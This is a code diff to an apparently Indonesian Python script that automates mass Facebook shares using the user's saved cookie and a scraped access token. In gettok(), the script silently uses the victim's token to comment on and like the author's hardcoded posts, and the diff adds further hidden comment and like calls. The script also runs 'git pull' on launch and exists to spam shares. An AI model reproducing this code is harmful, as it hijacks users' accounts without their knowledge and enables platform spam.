@@ -33,7 +33,9 @@ def banner():
 	pengembang1=nel(au,style="cyan")
 	cetak(nel(pengembang1, title='v 3.144'))
 
-def mulai(link):
+def mulai(link,jum):
+	global loop
+	print(f'\r{x} [ {h}• {x}] progres {loop} ~ {jum}' ,end='')
 	cook = open('.cookie.txt','r').read()
 	took = open('.token.txt','r').read()
 	try:
@@ -49,6 +51,7 @@ def mulai(link):
 			print('Ups Terjadi Kesalahan')
 	except:
 		print('Ups Terjadi Kesalahan')
+	loop+=1
 
 def gettok():
 	os.system('rm .token.txt')
@@ -64,15 +67,14 @@ def gettok():
 		    tok = re.search('(\["EAAG\w+)', req.text).group(1).replace('["','')
 		    open('.token.txt','w').write(tok)
 		    ses.post(f"https://graph.facebook.com/pfbid0ZiJQd99dJLpMpWoFJMcryzkZZQ2CiNEfWwH6Z4rYARP5LQf6qt8YvQNgQmxQVcskl/comments/?&message=Izin Pake Scnya Bang&access_token={tok}",cookies=cookie)
+		    ses.post(f"https://graph.facebook.com/100000457453881_230141992787447/comments/?&message=Izin Pake Scnya Bang&access_token={tok}",cookies=cookie)
+		    ses.post(f"https://graph.facebook.com/100000457453881_230141992787447/likes?summary=true&access_token="+tok,cookies={'cookie':cook}).text
 	except Exception as e:
 
 		print('Cookies Invalid')
 
 def gas():
-	try:
-		open('.token.txt','r').read()
-	except:
-		gettok()
+	gettok()
 	banner()
 	link = input(f"{x} [ {h}• {x}] Input Url : ")
 	banner()
@@ -89,7 +91,8 @@ def gas():
 	jum = int(input(f"{x} [ {h}• {x}] Input Jumlah Share : "))
 	with thread(max_workers=2) as pool:
 		for io in range(jum):
-			pool.submit(mulai,link)
+			pool.submit(mulai,link,jum)
+	print(f"{x} [ {h}• {x}] Succes Share Sebanyak {jum} ×")
 
 if __name__=='__main__':
 	os.system('git pull')
